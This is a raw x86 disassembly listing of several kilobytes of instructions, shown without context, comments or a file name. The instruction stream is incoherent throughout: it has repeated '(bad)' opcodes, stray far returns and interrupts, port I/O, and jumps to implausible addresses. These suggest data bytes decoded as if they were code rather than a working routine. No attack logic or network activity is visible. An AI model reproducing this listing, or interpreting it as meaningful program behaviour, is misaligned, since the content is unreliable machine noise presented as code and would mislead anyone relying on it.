  4303e1:	(bad)  
  4303e2:	call   0x1422d4f
  4303e7:	call   0x1372d77
  4303ec:	jne    0x430379
  4303ee:	xor    edi,esp
  4303f0:	add    eax,DWORD PTR [eax+0xc018d]
  4303f6:	push   DWORD PTR [eax]
  4303f8:	call   0xcc2d54
  4303fd:	enter  0x45ff,0xe0
  430401:	mov    ecx,DWORD PTR [ebp-0x28]
  430404:	xor    eax,DWORD PTR [eax]
  430406:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43040c:	(bad)  
  43040d:	xchg   ebp,eax
  43040e:	call   0x1420512
  430413:	mov    cl,0x45
  430415:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43041b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430422:	mov    edi,edi
  430424:	or     BYTE PTR [eax],cl
  430426:	inc    ebp
  430427:	test   DWORD PTR gs:[eax],eax
  43042a:	je     0x430471
  43042c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430432:	xor    edx,DWORD PTR [eax-0x73]
  430435:	push   ebp
  430436:	or     BYTE PTR [ebp+0x21007572],al
  43043c:	inc    ebp
  43043d:	loopne 0x4303ca
  43043f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430446:	int    0x0
  430448:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43044e:	inc    ebp
  43044f:	push   ebp
  430450:	cmp    ebp,eax
  430452:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430459:	cld    
  43045a:	fadd   QWORD PTR [eax+0x3b014d]
  430460:	jne    0x430492
  430462:	push   0xf8898557
  430467:	loopne 0x4304de
  430469:	inc    ebp
  43046a:	lea    eax,[ebx+0x72e8e4cc]
  430470:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430476:	jmp    0x4304ab
  430478:	mov    edi,DWORD PTR [edi+0x4572bc]
  43047e:	xor    eax,edi
  430480:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43048a:	rcl    BYTE PTR [eax-0x40],1
  43048d:	inc    ebp
  43048e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430496:	inc    ebp
  430497:	xchg   ebp,eax
  430498:	ud0    ebp,DWORD PTR [ebx]
  43049b:	inc    DWORD PTR [eax]
  43049d:	daa    
  43049e:	jbe    0x4304a0
  4304a0:	mov    dl,BYTE PTR [eax-0x80]
  4304a3:	push   ebp
  4304a4:	pop    ds
  4304a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4304a8:	inc    eax
  4304a9:	retf   
  4304aa:	inc    ebp
  4304ab:	iret   
  4304ac:	jb     0x430476
  4304ae:	mov    eax,DWORD PTR [edi]
  4304b0:	int3   
  4304b1:	inc    ebp
  4304b2:	inc    ebp
  4304b3:	add    DWORD PTR [ecx],esi
  4304b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4304bc:	xor    dh,BYTE PTR [ebx]
  4304be:	pushf  
  4304bf:	lea    ecx,[ecx+0x4d72d808]
  4304c5:	add    BYTE PTR [ebx],dh
  4304c7:	inc    ebp
  4304c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4304ce:	xor    dl,BYTE PTR [edx]
  4304d0:	add    eax,DWORD PTR [ebp-0x77]
  4304d3:	mov    eax,esp
  4304d5:	fmul   QWORD PTR [ebp-0x3d]
  4304d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4304df:	mov    DWORD PTR [ebp-0x24],eax
  4304e2:	rol    DWORD PTR [ebp-0x64],1
  4304e5:	xor    eax,edi
  4304e7:	mov    ecx,0xff858db0
  4304ec:	clc    
  4304ed:	enter  0x4d45,0x3c
  4304f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4304f8:	test   esi,edi
  4304fa:	clc    
  4304fb:	inc    DWORD PTR [ebp+0x45]
  4304fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430506:	test   DWORD PTR [ecx],esi
  430508:	clc    
  430509:	pushf  
  43050a:	inc    ebp
  43050b:	(bad)  
  43050c:	cmp    ah,bh
  43050e:	pushf  
  43050f:	inc    ebp
  430510:	mov    edx,DWORD PTR [eax-0x24]
  430513:	add    BYTE PTR [ebp+0x0],dl
  430516:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43051c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430520:	add    al,dl
  430522:	jmp    0x10406f2
  430527:	jb     0x430576
  430529:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43052f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430532:	xor    ecx,DWORD PTR [edi]
  430534:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430538:	(bad)  
  43053a:	clc    
  43053b:	int3   
  43053c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430543:	push   cs
  430544:	xor    ecx,eax
  430546:	xor    esp,ecx
  430548:	add    ebp,DWORD PTR [eax]
  43054a:	add    esi,DWORD PTR [eax]
  43054c:	(bad)  
  43054e:	retf   0x55cc
  430551:	repnz mov eax,DWORD PTR [ebp-0x10]
  430555:	(bad)  
  430556:	cli    
  430557:	fdiv   st(1),st
  430559:	test   DWORD PTR [eax+edi*8],ecx
  43055c:	dec    ebp
  43055d:	inc    ebp
  43055e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430564:	add    BYTE PTR [ebp+0x0],al
  430567:	mov    ecx,DWORD PTR [ebp-0x24]
  43056a:	mov    ecx,ebx
  43056c:	clc    
  43056d:	jne    0x43053a
  43056f:	mov    esi,0xd672d3
  430574:	into   
  430575:	into   
  430576:	scas   eax,DWORD PTR es:[edi]
  430577:	dec    ebp
  430578:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43057e:	sub    ecx,esi
  430580:	cmp    ecx,DWORD PTR [ebp+0x77]
  430583:	(bad)  
  430584:	mov    edi,eax
  430586:	mov    al,0x85
  430588:	mov    eax,edi
  43058a:	add    BYTE PTR [ebp-0x75],al
  43058d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430594:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43059a:	(bad)  
  43059c:	retf   0x559c
  43059f:	(bad)  
  4305a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4305a7:	inc    ebp
  4305a8:	add    eax,0xeb9c4d3f
  4305ad:	(bad)  
  4305ae:	mov    ecx,eax
  4305b0:	lods   al,BYTE PTR ds:[esi]
  4305b1:	test   DWORD PTR [ebp-0x8],edx
  4305b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4305b7:	mov    eax,DWORD PTR [ebx]
  4305b9:	lock add ecx,ebx
  4305bc:	bswap  esi
  4305be:	retf   0x55d1
  4305c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4305c7:	jmp    0x4305c2
  4305c9:	add    BYTE PTR ds:0xebc44d8b,al
  4305cf:	push   ebp
  4305d0:	mov    ebp,DWORD PTR [ebx]
  4305d2:	test   al,0x8b
  4305d4:	push   ebp
  4305d5:	clc    
  4305d6:	xor    ecx,ebx
  4305d8:	xor    ecx,esi
  4305da:	add    edx,ecx
  4305dc:	add    eax,DWORD PTR [edx+0xca010f]
  4305e2:	push   ebp
  4305e3:	dec    ebp
  4305e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4305ea:	stc    
  4305eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4305f1:	scas   eax,DWORD PTR es:[edi]
  4305f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4305f8:	xor    ebp,DWORD PTR [ebx]
  4305fa:	xor    edi,DWORD PTR [ebx]
  4305fc:	add    esi,DWORD PTR [edi+0x3]
  4305ff:	mov    ecx,DWORD PTR [edi]
  430601:	clc    
  430602:	retf   0x55cb
  430605:	into   
  430606:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43060d:	mov    eax,0x3376554d
  430612:	mov    esi,DWORD PTR [ebx]
  430614:	enter  0x5503,0x3
  430618:	xor    ecx,DWORD PTR [edi]
  43061a:	xor    ecx,edx
  43061c:	add    edx,DWORD PTR [ebp+0x3]
  43061f:	mov    ecx,DWORD PTR [edi]
  430621:	lock retf 0x4dfa
  430625:	stc    
  430626:	mov    ecx,DWORD PTR [eax]
  430628:	or     BYTE PTR [ebp+0x4d],cl
  43062b:	jmp    0x10706bb
  430630:	dec    ebp
  430631:	dec    ebp
  430632:	(bad)  
  430633:	mov    esp,esp
  430635:	clc    
  430636:	test   ebx,ecx
  430638:	clc    
  430639:	ror    DWORD PTR [ebp-0x2a],cl
  43063c:	mov    esi,ecx
  43063e:	in     al,dx
  43063f:	scas   eax,DWORD PTR es:[edi]
  430640:	inc    ebp
  430641:	mov    esi,DWORD PTR [ebx]
  430643:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43064a:	retf   
  43064b:	ja     0x43061b
  43064d:	mov    ebp,DWORD PTR [eax-0x48]
  430650:	dec    ebp
  430651:	xor    ecx,DWORD PTR [di+0x3]
  430655:	mov    ebp,eax
  430657:	clc    
  430658:	push   ebp
  430659:	retf   
  43065a:	mov    dl,bl
  43065c:	adc    esi,edx
  43065e:	jb     0x43062e
  430660:	add    BYTE PTR [edi-0x3b7474b3],ch
  430666:	in     al,dx
  430667:	jge    0x430634
  430669:	sub    ecx,DWORD PTR [ebp+0x3b]
  43066c:	mov    esi,DWORD PTR [edi-0x24]
  43066f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430676:	mov    BYTE PTR [ebx-0x34b20729],cl
  43067c:	mov    edx,ebx
  43067e:	in     al,dx
  43067f:	(bad)  
  430680:	ror    esi,cl
  430682:	push   ebp
  430683:	scas   eax,DWORD PTR es:[edi]
  430684:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43068a:	fwait
  43068b:	sub    esi,DWORD PTR [edx]
  43068d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430693:	lods   al,BYTE PTR ds:[esi]
  430694:	xor    esp,DWORD PTR [ebx]
  430696:	add    ecx,DWORD PTR [ebp-0x18]
  430699:	mov    edi,DWORD PTR [ebp-0x8]
  43069c:	mov    bl,cl
  43069e:	cmp    dl,bl
  4306a0:	jb     0x430670
  4306a2:	add    dh,dl
  4306a4:	dec    ebp
  4306a5:	scas   eax,DWORD PTR es:[edi]
  4306a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4306ac:	shr    DWORD PTR [ebx],cl
  4306ae:	into   
  4306af:	cmp    edx,esi
  4306b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4306b7:	dec    ebp
  4306b8:	dec    ebp
  4306b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4306bf:	retf   
  4306c0:	xor    edx,esi
  4306c2:	add    ecx,esi
  4306c4:	imul   ecx,edx
  4306c7:	mov    DWORD PTR [ebp+0x8],edx
  4306ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4306cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4306d3:	add    esi,DWORD PTR [ebx]
  4306d5:	mov    ah,0x3
  4306d7:	inc    ebp
  4306d8:	rdtsc  
  4306da:	xlat   BYTE PTR ds:[ebx]
  4306db:	pushf  
  4306dc:	jge    0x430667
  4306de:	xor    ebx,esp
  4306e0:	sub    eax,DWORD PTR [ebp-0x73]
  4306e3:	(bad)  
  4306e4:	cmp    al,al
  4306e6:	jb     0x43066d
  4306e8:	add    al,bh
  4306ea:	ror    DWORD PTR [ebp-0x7a],1
  4306ed:	xor    edi,edi
  4306ef:	add    edi,edi
  4306f1:	jmp    0x430740
  4306f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4306f9:	dec    ebp
  4306fa:	into   
  4306fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430701:	fwait
  430702:	shl    DWORD PTR [edx],cl
  430704:	retf   0x5588
  430707:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43070d:	add    eax,DWORD PTR [eax]
  43070f:	call   0x8ace5c61
  430714:	fcom   DWORD PTR [ecx]
  430716:	retf   
  430717:	jb     0x43077e
  430719:	add    ch,cl
  43071b:	dec    ebp
  43071c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430722:	dec    ebp
  430723:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430729:	jge    0x4306f9
  43072b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430731:	add    cl,dh
  430733:	dec    ebp
  430734:	dec    DWORD PTR [ebx-0x2c031b75]
  43073a:	adc    BYTE PTR [ebp+0x1],0x8b
  43073e:	add    ah,bl
  430740:	jge    0x4306ce
  430742:	push   0xffffff9b
  430744:	push   0x8b3032
  430749:	shl    BYTE PTR [ebp+0x55],0x6a
  43074d:	xor    edi,edi
  43074f:	xor    edx,DWORD PTR [ebx+eax*1]
  430752:	inc    ebp
  430753:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430759:	dec    ebp
  43075a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430760:	jbe    0x4306ed
  430762:	mov    esp,eax
  430764:	ror    bl,1
  430766:	enter  0x14ce,0xaf
  43076a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430770:	push   ebp
  430771:	retf   0x5540
  430774:	push   ebp
  430775:	mov    esi,DWORD PTR [edx-0x18]
  430778:	mov    edx,ebx
  43077a:	cld    
  43077b:	(bad)  
  43077c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430783:	sti    
  430784:	add    dh,cl
  430786:	push   0xffffff94
  430788:	call   FWORD PTR [ebx+0x3b5032d0]
  43078e:	mov    ecx,DWORD PTR [edi]
  430790:	enter  0x455e,0xff
  430794:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43079a:	xor    esi,DWORD PTR [ebx]
  43079c:	mov    DWORD PTR [ebx],0xcace0f9c
  4307a2:	aas    
  4307a3:	push   ebp
  4307a4:	inc    ebp
  4307a5:	xor    edx,esi
  4307a7:	add    edx,esi
  4307a9:	mov    eax,DWORD PTR [ebx]
  4307ab:	(bad)  
  4307ac:	jmp    0x43073a
  4307ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4307b4:	rol    ah,1
  4307b6:	mov    esi,0xf133104d
  4307bb:	mov    edx,0xff388d80
  4307c0:	mov    dh,0xd1
  4307c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4307c5:	mov    eax,DWORD PTR [edx-0x28]
  4307c8:	add    BYTE PTR [ebp-0x75],bh
  4307cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4307d2:	fwait
  4307d3:	retf   0x8632
  4307d6:	cmp    ebp,0x8
  4307d9:	call   ebx
  4307db:	inc    ebp
  4307dc:	inc    ebp
  4307dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4307e3:	mov    esi,DWORD PTR [ecx]
  4307e5:	int3   
  4307e6:	pushf  
  4307e7:	add    al,0xc7
  4307e9:	add    al,al
  4307eb:	add    bl,al
  4307ed:	(bad)  
  4307ee:	clc    
  4307ef:	int3   
  4307f0:	inc    ebp
  4307f1:	add    BYTE PTR [ecx],dh
  4307f3:	push   eax
  4307f4:	pushf  
  4307f5:	mov    edi,eax
  4307f7:	enter  0xc008,0x85
  4307fb:	aas    
  4307fc:	clc    
  4307fd:	gs inc ebp
  4307ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430805:	push   ss
  430806:	xor    ecx,DWORD PTR [ebp+0x3]
  430809:	sub    edx,DWORD PTR [ecx-0x76]
  43080c:	dec    ebp
  43080d:	add    DWORD PTR [ebx+0x88d845],ecx
  430813:	mov    esi,DWORD PTR [ebx]
  430815:	or     BYTE PTR [ebx],al
  430817:	cmp    edx,DWORD PTR [ecx-0x34]
  43081a:	dec    ebp
  43081b:	out    dx,eax
  43081c:	xor    eax,DWORD PTR [ebp+0x3]
  43081f:	mov    edx,DWORD PTR [ecx-0x28]
  430822:	dec    ebp
  430823:	add    BYTE PTR [ebx],dh
  430825:	push   0x518003
  43082a:	push   eax
  43082b:	add    BYTE PTR [ebx-0x300748b],cl
  430831:	sbb    BYTE PTR [ebp+0x45],cl
  430834:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43083a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430840:	dec    ebp
  430841:	inc    ebp
  430842:	xor    edx,esi
  430844:	add    edx,esi
  430846:	push   ecx
  430847:	(bad)  
  430848:	dec    ebp
  430849:	mov    al,ds:0xc5d83dff
  43084e:	retf   
  43084f:	(bad)  
  430850:	into   
  430851:	sub    bh,bh
  430853:	dec    esp
  430854:	adc    al,0x9c
  430856:	inc    ebp
  430857:	push   ebp
  430858:	test   DWORD PTR [edi],ecx
  43085a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430861:	jmp    0xc9bc1775
  430866:	add    cl,dl
  430868:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430872:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430878:	rol    BYTE PTR [eax],0x54
  43087b:	clc    
  43087c:	gs jb  0x430886
  43087f:	mov    eax,DWORD PTR [ebp-0x30]
  430882:	xor    al,0x40
  430884:	sub    al,0xc7
  430886:	mov    al,ah
  430888:	add    DWORD PTR [ebp+0x4534f845],eax
  43088e:	sub    al,0x80
  430890:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430897:	mov    ch,0xff
  430899:	clc    
  43089a:	add    DWORD PTR [ebp+0x60],0x3d
  43089e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4308a5:	inc    ebp
  4308a6:	dec    DWORD PTR [ebx-0x3427f701]
  4308ac:	test   esi,ecx
  4308ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4308b4:	push   eax
  4308b5:	add    DWORD PTR [ebp+0x0],eax
  4308b8:	dec    ebx
  4308ba:	or     al,0xce
  4308bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4308c3:	into   
  4308c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4308ca:	mov    esi,ecx
  4308cc:	sar    bh,0x45
  4308cf:	adc    al,0x8b
  4308d1:	clc    
  4308d2:	fadd   DWORD PTR [ebp+0x0]
  4308d5:	mov    ebp,DWORD PTR [edx+0x8]
  4308d8:	push   edi
  4308d9:	adc    BYTE PTR [eax+0x1],0x83
  4308dd:	add    al,al
  4308df:	retf   
  4308e0:	mov    ecx,esi
  4308e2:	cld    
  4308e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4308e9:	into   
  4308ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4308f0:	jne    0x430925
  4308f2:	inc    DWORD PTR [ebx]
  4308f4:	rcl    BYTE PTR [ecx+0x50],1
  4308f7:	push   eax
  4308f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4308fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430905:	sar    bh,0x84
  430908:	or     BYTE PTR [ebx],al
  43090a:	push   eax
  43090b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430911:	pushf  
  430912:	xor    edi,eax
  430914:	pushf  
  430915:	mov    ah,0x89
  430917:	test   esp,ebp
  430919:	clc    
  43091a:	inc    ebp
  43091b:	inc    ebp
  43091c:	mov    DWORD PTR [eax+eax*8],esi
  43091f:	sub    al,0x32
  430921:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430928:	dec    ebp
  430929:	xor    eax,DWORD PTR gs:[edi+0x3]
  43092d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430933:	xor    eax,DWORD PTR gs:[edi+0x3]
  430937:	or     DWORD PTR [ecx+0x45ff085c],0x0
  43093e:	shl    DWORD PTR [ebp-0x380064],1
  430944:	enter  0x858d,0x60
  430948:	clc    
  430949:	inc    DWORD PTR [ebp+0x50]
  43094c:	cmp    al,0x75
  43094e:	pushf  
  43094f:	(bad)  
  430950:	(bad)  
  430951:	pop    esp
  430952:	lods   al,BYTE PTR ds:[esi]
  430953:	inc    DWORD PTR [ebp+0x4508f8ff]
  430959:	mov    edi,DWORD PTR [esi]
  43095b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430962:	test   DWORD PTR [edi-0x8],edx
  430965:	sbb    al,0x45
  430967:	add    BYTE PTR [eax],bh
  430969:	push   0x8b809c
  43096e:	loopne 0x4309b5
  430970:	push   ebp
  430971:	mov    esi,DWORD PTR [ebx]
  430973:	cld    
  430974:	add    eax,DWORD PTR [eax+0xf013b]
  43097a:	adc    al,0x0
  43097c:	add    bh,bh
  43097e:	jmp    0xc00a9b
  430983:	add    BYTE PTR [ebp+0x45],cl
  430986:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43098c:	dec    ebp
  43098d:	push   0x38033
  430992:	cmp    eax,DWORD PTR [eax]
  430994:	unpcklps xmm7,xmm0
  430997:	jne    0x430999
  430999:	dec    DWORD PTR [ebx+0x5545c818]
  43099f:	mov    DWORD PTR [ebx],esi
  4309a1:	shl    BYTE PTR [ebx],1
  4309a3:	inc    ebp
  4309a4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  4309aa:	retf   0x5575
  4309ad:	dec    DWORD PTR [ebx-0x5ba13e8]
  4309b3:	(bad)  
  4309b4:	stc    
  4309b5:	loopne 0x4309c3
  4309b7:	test   DWORD PTR [ebp-0x8],ecx
  4309ba:	xor    eax,DWORD PTR [ebp+0x3]
  4309bd:	mov    ebp,ecx
  4309bf:	rol    BYTE PTR [eax],1
  4309c1:	inc    ebp
  4309c2:	add    BYTE PTR [eax-0x7747ab3],bh
  4309c8:	clc    
  4309c9:	inc    ebp
  4309ca:	retf   
  4309cb:	mov    edx,ebx
  4309cd:	loopne 0x4309a5
  4309cf:	retf   
  4309d0:	into   
  4309d1:	into   
  4309d2:	scas   eax,DWORD PTR es:[edi]
  4309d3:	dec    ebp
  4309d4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  4309da:	sub    ecx,esi
  4309dc:	cmp    ecx,DWORD PTR [ebp+0x77]
  4309df:	(bad)  
  4309e0:	mov    edi,eax
  4309e2:	enter  0x8985,0xf8
  4309e6:	add    BYTE PTR [ebp-0x75],al
  4309e9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  4309f0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4309f6:	(bad)  
  4309f8:	retf   0x559c
  4309fb:	(bad)  
  4309fc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a03:	inc    ebp
  430a04:	add    eax,0xeb9c4d3f
  430a09:	(bad)  
  430a0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a10:	xor    ecx,DWORD PTR [ebp+0x33]
  430a13:	mov    eax,DWORD PTR [ebx]
  430a15:	in     al,dx
  430a16:	add    ecx,ebx
  430a18:	bswap  esi
  430a1a:	retf   0x55d1
  430a1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430a23:	jmp    0x430a1e
  430a25:	add    BYTE PTR ds:0xebf44d8b,al
  430a2b:	push   ebp
  430a2c:	mov    ebp,DWORD PTR [ebx]
  430a2e:	mov    eax,0x33f8558b
  430a33:	retf   
  430a34:	xor    ecx,esi
  430a36:	add    edx,ecx
  430a38:	add    eax,DWORD PTR [edx+0xca010f]
  430a3e:	push   ebp
  430a3f:	dec    ebp
  430a40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430a46:	stc    
  430a47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430a4d:	scas   eax,DWORD PTR es:[edi]
  430a4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430a54:	xor    ebp,DWORD PTR [ebx]
  430a56:	xor    edi,DWORD PTR [ebx]
  430a58:	add    esi,DWORD PTR [edi+0x3]
  430a5b:	mov    ecx,DWORD PTR [edi]
  430a5d:	clc    
  430a5e:	retf   0x55cb
  430a61:	into   
  430a62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430a69:	test   al,0x4d
  430a6b:	push   ebp
  430a6c:	jbe    0x430aa1
  430a6e:	mov    esi,DWORD PTR [ebx]
  430a70:	mov    al,0x3
  430a72:	push   ebp
  430a73:	add    esi,DWORD PTR [ebx]
  430a75:	rdpmc  
  430a77:	retf   0x5503
  430a7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a80:	dec    ebp
  430a81:	stc    
  430a82:	mov    ecx,DWORD PTR [eax]
  430a84:	or     BYTE PTR [ebp+0x4d],cl
  430a87:	jmp    0x1370b17
  430a8c:	dec    ebp
  430a8d:	dec    ebp
  430a8e:	(bad)  
  430a8f:	mov    esp,esp
  430a91:	clc    
  430a92:	test   ebx,ecx
  430a94:	clc    
  430a95:	ror    DWORD PTR [ebp-0x2a],cl
  430a98:	mov    esi,ecx
  430a9a:	lock scas eax,DWORD PTR es:[edi]
  430a9c:	inc    ebp
  430a9d:	mov    esi,DWORD PTR [ebx]
  430a9f:	hlt    
  430aa0:	pushf  
  430aa1:	jge    0x430a2e
  430aa3:	sub    esp,esp
  430aa5:	cmp    ecx,ebx
  430aa7:	ja     0x430a77
  430aa9:	mov    ebp,DWORD PTR [eax-0x58]
  430aac:	dec    ebp
  430aad:	xor    ecx,DWORD PTR [di+0x3]
  430ab1:	mov    ebp,eax
  430ab3:	clc    
  430ab4:	push   ebp
  430ab5:	retf   
  430ab6:	mov    dl,bl
  430ab8:	adc    esi,edx
  430aba:	jb     0x430a8a
  430abc:	add    BYTE PTR [edi-0xb7474b3],ch
  430ac2:	lock jge 0x430a90
  430ac5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430ac8:	mov    esi,DWORD PTR [edi-0x28]
  430acb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430ad2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430ad8:	mov    edx,ebx
  430ada:	lock (bad) 
  430adc:	ror    esi,cl
  430ade:	push   ebp
  430adf:	scas   eax,DWORD PTR es:[edi]
  430ae0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430ae6:	fwait
  430ae7:	sub    esi,DWORD PTR [edx]
  430ae9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430af0:	xor    esp,DWORD PTR [ebx]
  430af2:	add    ecx,DWORD PTR [ebp-0x18]
  430af5:	mov    edi,DWORD PTR [ebp-0x8]
  430af8:	mov    bl,cl
  430afa:	cmp    dl,bl
  430afc:	jb     0x430acc
  430afe:	add    dh,dl
  430b00:	dec    ebp
  430b01:	scas   eax,DWORD PTR es:[edi]
  430b02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b08:	shr    DWORD PTR [ebx],cl
  430b0a:	into   
  430b0b:	cmp    edx,esi
  430b0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b13:	dec    ebp
  430b14:	dec    ebp
  430b15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b1b:	retf   
  430b1c:	xor    edx,esi
  430b1e:	add    ecx,esi
  430b20:	imul   ecx,edx
  430b23:	mov    DWORD PTR [ebp+0x8],edx
  430b26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430b29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430b2f:	add    esi,DWORD PTR [ebx]
  430b31:	rol    BYTE PTR [ebx],0x45
  430b34:	rdtsc  
  430b36:	xlat   BYTE PTR ds:[ebx]
  430b37:	pushf  
  430b38:	jge    0x430ac3
  430b3a:	xor    ebx,eax
  430b3c:	sub    eax,DWORD PTR [ebp-0x73]
  430b3f:	(bad)  
  430b40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430b47:	dec    ebp
  430b48:	xchg   BYTE PTR [ebx],dh
  430b4a:	inc    DWORD PTR [ebx]
  430b4c:	(bad)  
  430b4d:	jmp    0x430b9c
  430b4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430b55:	dec    ebp
  430b56:	into   
  430b57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430b5d:	fwait
  430b5e:	shl    DWORD PTR [edx],cl
  430b60:	retf   0x5588
  430b63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430b69:	add    eax,DWORD PTR [eax]
  430b6b:	call   0x8ace60bd
  430b70:	fcom   QWORD PTR [ecx]
  430b72:	retf   
  430b73:	jb     0x430bda
  430b75:	add    ch,cl
  430b77:	dec    ebp
  430b78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430b7e:	dec    ebp
  430b7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b85:	jge    0x430b55
  430b87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b8d:	add    cl,dh
  430b8f:	dec    ebp
  430b90:	dec    DWORD PTR [ebx-0x2c031b01]
  430b96:	inc    ebp
  430b97:	push   ebp
  430b98:	dec    DWORD PTR [ebx-0x73ff2734]
  430b9e:	lea    ebx,[ebx-0x7400cdac]
  430ba4:	push   eax
  430ba5:	mov    ah,0x45
  430ba7:	push   ebp
  430ba8:	mov    esi,DWORD PTR [ebx]
  430baa:	les    esi,FWORD PTR [ebx]
  430bac:	add    BYTE PTR [ebx],al
  430bae:	inc    DWORD PTR [ebx]
  430bb0:	mov    ecx,DWORD PTR [edi]
  430bb2:	cld    
  430bb3:	retf   0x4d80
  430bb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430bbc:	jne    0x430b49
  430bbe:	jmp    eax
  430bc0:	ror    bl,1
  430bc2:	or     cl,dh
  430bc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430bca:	not    bl
  430bcc:	adc    al,0xca
  430bce:	inc    ebp
